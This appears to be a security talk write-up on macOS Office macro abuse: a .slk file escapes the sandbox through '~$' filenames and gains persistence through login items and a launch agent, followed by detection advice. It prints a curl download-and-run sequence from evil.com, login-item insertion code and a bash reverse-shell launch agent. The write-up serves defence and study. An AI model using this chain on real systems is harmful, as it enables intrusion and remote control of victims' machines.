# Office Macro Exploitation and Sandbox Bypass on macOS

## Overview
This document details a method of exploiting macros in Microsoft Office applications on macOS, specifically focusing on bypassing the sandbox and achieving persistence. The attack vector involves an Excel `.slk` file that spawns a calculator (`calc`) via XLM macros, which are now sandboxed. However, this is just the beginning of the exploit chain.

## Initial Attack Vector
### PoC.slk: Spawning Calculator (via XLM)
- **Macro Execution**: The `.slk` file triggers the execution of a macro that spawns `calc`.
- **Sandboxing**: Macros are now sandboxed, but there are ways to bypass these restrictions.

### Sandbox Bypass
- **File Creation**: The sandbox can be bypassed to create files anywhere on the filesystem, as long as the filename ends with `~$something`.
  - Example:
    ```bash
    codesign --display -v --entitlements - "Microsoft Word.app"
    com.apple.security.temporary-exception.sbpl
    (allow file-read* file-write* 
      (require-any 
        (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$")) 
      ) 
    )
    ```

### Download and Execute
- **Process Monitor Events**:
  - `curl` is used to download a malicious script.
  - `python` is used to execute the downloaded script.
  - Both actions are allowed within the sandbox.
  - Example:
    ```json
    {
      "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
      "process": {
        "path": "/usr/bin/curl",
        "arguments": [
          "curl",
          "-L",
          "http://evil.com/escape.py",
          "-o",
          "/tmp/~$escape.py"
        ]
      }
    },
    {
      "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
      "process": {
        "path": "/System/Library/.../2.7/bin/python2.7",
        "arguments": [
          "python",
          "/tmp/~$escape.py"
        ]
      }
    }
    ```

## Persistence Mechanism
### Login Item Persistence
- **Adding to Login Items**:
  - A malicious application can be added to the user's login items to achieve persistence.
  - Example:
    ```python
    appURL = CoreFoundation.CFURLCreateWithFileSystemPath(
              kCFAllocatorDefault, path2App.get_ref(),
              kCFURLPOSIXPathStyle, 1)
    items = CoreServices.LSSharedFileListCreate(
              kCFAllocatorDefault,
              kLSSharedFileListSessionLoginItems, None)
    CoreServices.LSSharedFileListInsertItemURL(
               loginItems, kLSSharedFileListItemLast,
               None, None, appURL, None, None)
    ```

### Launch Agent Creation
- **Creating a Launch Agent**:
  - A launch agent can be created to run a reverse shell.
  - Example:
    ```xml
    <key>ProgramArguments</key>
    <array>
      <string>/bin/bash</string>
      <string>-c</string>
      <string>/bin/bash -i &gt;&amp; /dev/tcp//8080 0&gt;&amp;1</string>
    </array>
    ```

### Archive Utility Exploit
- **Persisting a .zip File**:
  - Persisting a `.zip` file will cause macOS to invoke the default handler, which is outside the sandbox.
  - Example:
    ```bash
    ~/Library/~$payload.zip
    LaunchAgents/
    foo.plist
    ```

## Full Exploit Chain
1. **User Opens .slk File**: The user opens a malicious `.slk` file.
2. **Downloads and Persists Payload**: The file downloads and persists a `.zip` payload.
3. **Next Login**: On the next login, the Archive Utility unzips the payload, creating a launch agent.
4. **Launch Agent Runs**: The launch agent runs, executing a reverse shell.

## Defense and Detection
### Protection Against Macro-Based Attacks
- **Behavior-Based Security Tools**: Use behavior-based security tools to detect and block suspicious activities.
- **Process Monitoring**:
  - Detect processes spawned by Excel, such as `curl` and `python`.
  - Example:
    ```json
    {
      "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
      "process": {
        "path": "/Applications/Microsoft Excel.app",
        "pid": 1406
      }
    },
    {
      "event": "ES_EVENT_TYPE_NOTIFY_EXEC",
      "process": {
        "path": "/usr/bin/curl",
        "arguments": [
          "curl",
          "http://evil.com/escape.py",
          "-o",
          "/tmp/~$escape.py"
        ],
        "ppid": 1406
      }
    }
    ```

### File Monitoring
- **Detecting Suspicious Files**:
  - Monitor for suspicious file writes, such as those in `backgrounditems.btm`.
  - Example:
    ```json
    {
      "event": "ES_EVENT_TYPE_NOTIFY_WRITE",
      "file": {
        "destination": "~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm",
        "path": "/System/Library/CoreServices/backgroundtaskmanagementagent"
      }
    }
    ```

## Conclusion
- **Defense in Depth**: Ensure your macOS systems are protected by multiple layers of security.
- **Stay Informed**: Keep up-to-date with the latest security news and patches.

## Resources
- **Books**:
  - "The Art of Mac Malware" by Patrick Wardle
- **Articles**:
  - "Cryptocurrency Businesses Still Being Targeted by Lazarus" - Kaspersky
  - "Abusing the SYLK File Format" - Pieter Ceelen & Stan Hegt Pitts
  - "Lazarus APT Targets Mac Users With Poisoned Word Document" - Phil Stokes
- **Tools**:
  - MonitorKit
  - JamfProtect

## Acknowledgments
- **Friends of Objective-See**:
  - Airo
  - Guardian
  - Mobile Firewall
  - SecureMac
  - SmugMug
  - iVerify
  - Digital Guardian
  - Sophos
  - Halo Privacy

Thank you for your attention!